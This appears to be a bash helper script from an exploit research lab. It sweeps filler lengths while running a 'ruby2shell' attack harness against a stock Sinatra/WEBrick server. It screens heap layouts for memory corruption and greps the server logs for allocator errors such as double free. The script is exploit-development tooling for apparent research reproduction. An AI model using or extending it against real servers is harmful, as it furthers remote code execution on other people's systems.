#!/usr/bin/env bash
# Stock Sinatra/WEBrick N=572 with a filler part before _method. Screens for
# geometries that survive the delayed tcache-thread-shutdown consumer.
set -u
cd "$(dirname "$0")/../.." || exit 2
LENGTHS="${*:-8 16 24 32 40 48 56 64 72 80 96 112 128 160 192 224 256 320 384 512 768 1024}"
for length in $LENGTHS; do
  tag="webrickfill${length}"
  printf '== filler=%s\n' "$length"
  RUBY2SHELL_STOCK_N=572 RUBY2SHELL_STOCK_FILL="$length" \
    RUBY2SHELL_STOCK_ORDER=filler-first RUBY2SHELL_STOCK_SERVER=webrick \
    RUBY2SHELL_STOCK_SETTLE=2 \
    bash lab/repro/ruby2shell-stock-baseline.sh attack "$tag"
  printf 'allocator-diagnostic: '
  grep -E 'corrupted|malloc\(\)|free\(\)|double free|invalid' \
    "lab/build/evidence/stock-baseline-$tag.server.log" 2>/dev/null || echo '(none)'
done
